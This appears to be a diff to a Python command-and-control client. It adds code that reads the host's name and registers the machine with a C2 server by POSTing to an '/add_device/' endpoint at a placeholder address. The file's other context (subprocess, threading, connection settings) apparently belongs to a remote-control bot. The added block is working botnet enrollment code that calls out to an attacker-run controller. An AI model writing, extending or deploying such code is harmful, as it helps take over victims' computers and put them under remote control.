@@ -7,6 +7,38 @@ import subprocess
 import threading
 import os
 
+import requests
+
+# Getting system name and adding this device to the C2 server's device list
+
+def get_system_name():
+    try:
+        result = subprocess.run(['hostname'], capture_output=True, text=True)
+        system_name = result.stdout.strip()
+        return system_name
+    except Exception as e:
+        print(f"Error: {e}")
+        return 'Default_name'
+
+# Usage
+system_name = get_system_name()
+print(f"System name: {system_name}")
+c2_ip = '0.0.0.0'
+c2_port = '8000'
+add_device_url = f'http://{c2_ip}:{c2_port}/add_device/'
+
+try:
+    response = requests.post(add_device_url, data={'name':system_name,'ip_address':''})
+    if response.status_code == 200:
+        print("Form submitted successfully.")
+    else:
+        print(f"Form submission failed with status code: {response.status_code}")
+except requests.exceptions.RequestException as e:
+    print(f"Error submitting form: {e}")
+
+# Device added...
+
+
 # Connection settings
 
 HOST = '0.0.0.0'
